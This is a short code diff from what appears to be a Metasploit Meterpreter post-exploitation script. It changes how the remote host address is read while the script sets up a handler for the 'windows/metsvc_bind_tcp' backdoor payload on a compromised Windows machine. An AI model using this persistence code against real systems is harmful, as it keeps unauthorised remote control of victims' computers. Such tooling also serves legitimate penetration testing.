@@ -109,7 +109,7 @@ if client.platform =~ /win32|win64/
 		mul.datastore['WORKSPACE'] = client.workspace
 		mul.datastore['PAYLOAD'] = "windows/metsvc_bind_tcp"
 		mul.datastore['LPORT']   = rport
-		mul.datastore['RHOST']   = client.tunnel_peer.split(':')[0]
+		mul.datastore['RHOST']   = client.session_host
 		mul.datastore['ExitOnSession'] = false
 		mul.exploit_simple(
 			'Payload'        => mul.datastore['PAYLOAD'],
